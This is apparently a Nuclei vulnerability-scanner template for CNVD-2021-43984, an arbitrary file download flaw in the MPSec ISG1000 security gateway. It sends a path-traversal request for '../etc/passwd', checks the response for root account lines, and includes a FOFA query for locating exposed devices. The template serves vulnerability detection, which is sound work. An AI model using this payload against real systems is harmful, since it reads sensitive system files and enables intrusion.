http:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - condition: and
    part: header
    type: word
    words:
    - text/plain
    - USGSESSID=
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/webui/?g=sys_dia_data_down&file_name=../etc/passwd'
id: CNVD-2021-43984
info:
  author: DhiyaneshDk
  description: 'The MPSec ISG1000 safety gateway at MP Communications Technology Co.,
    Ltd. has any file download loophole, and attackers can use the loophole to obtain
    sensitive information.

    '
  metadata:
    fofa-query: "\u8FC8\u666E\u901A\u4FE1\u6280\u672F\u80A1\u4EFD\u6709\u9650\u516C\
      \u53F8"
    max-request: 1
    verified: true
  name: MPSec ISG1000 Security Gateway - Arbitrary File Download
  reference:
  - https://www.cnvd.org.cn/flaw/show/CNVD-2021-43984
  - https://github.com/chaitin/xray/blob/master/pocs/mpsec-isg1000-file-read.yml
  severity: high
  tags: cnvd,cnvd2021,mpsec,maipu,lfi,isg
